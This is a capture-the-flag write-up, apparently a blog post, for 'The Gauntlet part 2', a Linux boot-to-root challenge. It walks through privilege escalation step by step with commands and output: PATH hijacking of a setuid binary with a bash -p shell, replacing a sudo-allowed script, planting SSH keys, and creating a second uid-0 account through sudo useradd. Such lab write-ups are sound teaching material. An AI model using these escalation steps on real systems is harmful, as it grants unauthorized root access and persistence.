---
title: The Gauntlet part 2
tags: [linux, boot2root, privilege escalation, nordics-ddc-ecsc-2025]
date: 2025-03-17 00:00:03
draft: false
heroImage: ./assets/cyberlandslaget-ddc.png
---

# The Gauntlet part 2

<style>
.basis-1\/5{flex-basis: 5% !important;}
.max-w-prose{max-width: 100ch !important;}
.prose{max-width: 100ch !important;}
</style>

```
So, you think you're a l33t h4xx0r? Alright, here's my little gauntlet to you then: Break in through the website and get a shell one way or another. Once that's done, escalate your privileges and own the box. You won't be needing any fancy kernel exploits or such, this one's all about bad practices and misconfigurations. Doesn't sound too hard, now does it? Good luck!

Flag binaries are located at /home/*****/user.flag and /root/root.flag 
the-gauntlet.hkn
```

## Prerequisites
This writeup will be missing the rabbit holes, and other wrong paths I took. I decided to do this to save time so I can write more writeups. I might decide to write a more complete one later, so this will be a writeup in the mind of someone not doing any mistakes. But I'm happy to talk on the discord to discuss the challenge.

This is part 2 for The Gauntlet challenge, I recommend reading part 1 to understand context. 

## SSH
We have reverse shell access, but instead of relying on the reverse shell it's better to SSH. We saw earlier in the nmap scan that there is port 22 open.

We can add our public key into the file `.ssh/authorized_keys` that we need to create. 

If you do not know how to create SSH keys, I can recommend searching online as there are many guides.

After adding the keys, I can now ssh using the command

```
ssh user1@the-gauntlet.hkn
```

## Escalate privileges

To get an overview of what accounts there are, we can run

```
cat /etc/passwd
```

and we see there are 3 accounts, and first goal is getting access to user3.

```
user1:x:1001:1001:,,,:/home/user1:/bin/bash
user2:x:1002:1002:,,,:/home/user2:/bin/bash
user3:x:1003:1003:,,,:/home/user3:/bin/bash
```

### Getting access to user2

Running `ls -la` in home folder gives us the following output

```
total 1612
drwxr-x--- 1 user1 user1   4096 Mar 15 10:04 .
drwxr-xr-x 1 root  root    4096 Jan 25 20:57 ..
-rw-r--r-- 1 user1 user1    220 Jan 25 20:57 .bash_logout
-rw-r--r-- 1 user1 user1   3771 Jan 25 20:57 .bashrc
drwx------ 2 user1 user1   4096 Mar 15 10:04 .cache
-rw-r--r-- 1 user1 user1    807 Jan 25 20:57 .profile
drwxrwxr-x 2 user1 user1   4096 Mar 15 10:02 .ssh
-rwxrwxrwx 1 root  root    6032 Jan 25 20:56 app.py
-rw-r--r-- 1 user1 user1   8192 Mar 15 09:12 ctf.db
-rwsrwsr-x 1 user2 user2 776520 Jan 25 20:56 testBin
-rwxrwxrwx 1 user1 user1 821008 Jan 25 20:56 user.flag
```

We can see that testBin is owned by user2, and also has a setuid bit set.

Here is a short description of setuid from [Wikipedia](https://en.wikipedia.org/wiki/Setuid).

```
The Unix and Linux access rights flags setuid and setgid (short for set user identity and set group identity)[1] allow users to run an executable with the file system permissions of the executable's owner or group respectively and to change behaviour in directories.
```

So this means the binary can run with permissions of user2 even if we are not user2.

When first running testBin we get the following output

```
Usage: ./testBin <file>
```

and when providing a file we get output that seems to be from xxd 

```bash
00000000: 2320 5965 732c 2049 2067 6f74 2043 6861  # Yes, I got Cha
00000010: 7447 5054 2074 6f20 7772 6974 6520 7468  tGPT to write th
00000020: 6520 636f 6465 202d 2073 7565 206d 652e  e code - sue me.
00000030: 0a0a 6672 6f6d 2066 6c61 736b 2069 6d70  ..from flask imp
00000040: 6f72 7420 466c 6173 6b2c 2072 6571 7565  ort Flask, reque
00000050: 7374 2c20 7265 6469 7265 6374 2c20 7572  st, redirect, ur
00000060: 6c5f 666f 722c 2073 6573 7369 6f6e 2c20  l_for, session,
00000070: 7265 6e64 6572 5f74 656d 706c 6174 655f  render_template_
00000080: 7374 7269 6e67 0a69 6d70 6f72 7420 7371  string.import sq
```

So we can assume the xxd is running under the permissions user2 has.

We can abuse the path variable to check for variables in current directory with following commands.

```
PATH=.:${PATH}
export PATH
```

We can confirm this works by copying the user.flag binary as xxd.

```
cp user.flag xxd
```

When running the command `./testBin app.py` 
it runs the user.flag binary instead.

We can create our own binary that runs bash with user2 permissions

```
#include <stdlib.h>
#include <unistd.h>

int main(void) {
    char *const paramList[10] = {"/bin/bash", "-p", NULL};
    execve(paramList[0], paramList, NULL);
    return 0;
}
```

We can use nano to create a new file with name main.c

```
nano main.c
```

copy the contents over

compile the c file with 

```
gcc main.c
```

rename the file to be xxd and make it executable

```
cp a.out xxd
chmod +x xxd
```

When running the testBin this time we get a new shell and we can confirm we have user2 permissions with`id` command

```
uid=1001(user1) gid=1001(user1) euid=1002(user2) egid=1002(user2) groups=1002(user2),100(users),1001(user1)
```

So to continue, we can add our keys to the user2 and ssh into that account and get full permissions.

### Getting access to user3
When doing `ls -la` we can see the following output
```
drwxr-xr-x 1 user2 user2 4096 Mar 15 10:57 .
drwxr-xr-x 1 root  root  4096 Jan 25 20:57 ..
-rw-r--r-- 1 user2 user2  220 Jan 25 20:57 .bash_logout
-rw-r--r-- 1 user2 user2 3771 Jan 25 20:57 .bashrc
drwx------ 2 user2 user2 4096 Mar 15 10:57 .cache
drwxrwxr-x 3 user2 user2 4096 Mar 15 10:55 .local
-rw-r--r-- 1 user2 user2  807 Jan 25 20:57 .profile
drwxrwxr-x 2 user2 user2 4096 Mar 15 10:56 .ssh
-rwxrwxr-x 1 root  root    58 Jan 25 20:56 runMe.sh
```

runMe.sh is owned by root and running it prints out

```
If only I could be something useful...
```

After looking into cheatsheets of privilege escalation I find 
```
sudo -l
```

and the output as user2 is

```
Matching Defaults entries for user2 on ca0a1536712e:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User user2 may run the following commands on ca0a1536712e:
    (user3) NOPASSWD: /home/user2/runMe.sh
```

This means that we can run runMe.sh file as user3 without needing password.

since we own the folder runMe.sh is in, we can delete the file and create our own
shell file.

```
rm runMe.sh
echo "id" > runMe.sh
chmod +x runMe.sh
```

we can run runMe.sh as user3 using following command 

```
sudo -u user3 /home/user2/runMe.sh
```

and the output is 

```
uid=1003(user3) gid=1003(user3) groups=1003(user3),100(users)
```

to get access to user3 we can update the runMe.sh to create .ssh directory and add our public key to the authorized_keys file

update runMe.sh with following commands

```
cd ../user3
mkdir .ssh
cd .ssh
echo "public_key_here" > authorized_keys
```

We can ssh into the user3 like the previous accounts with command

```
ssh user3@the-gauntlet.hkn
```
### Getting Root

Running `sudo -l` as user3 gives us the following output
```
Matching Defaults entries for user3 on ca0a1536712e:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User user3 may run the following commands on ca0a1536712e:
    (root) NOPASSWD: /usr/sbin/useradd *
```

So we can execute useradd command as root, and any arguments without the need of the password.

So we can create accounts, so I assume we can create an account with root permissions, allowing us to run the root binary. We can do this with following commands


```
sudo -u root useradd -o --uid 0 --gid 0 user4 --password $(echo password | openssl passwd -6 -stdin)
```

The command creates user4 with password `password` that is encrypted using openssl, and we have `-o` tag that bypasses duplicate uid check.

We can now log into user4 with `su user4` and enter `password` as the password. 

we can confirm we have root with `id`

```
uid=0(root) gid=0(root) groups=0(root)
```

last step is running the root binary
```
./root/root.flag
```

and we get the following flag

```
DDC{1_h0p3_y0u_enj0y3d_my_f1r27_B2R}
```

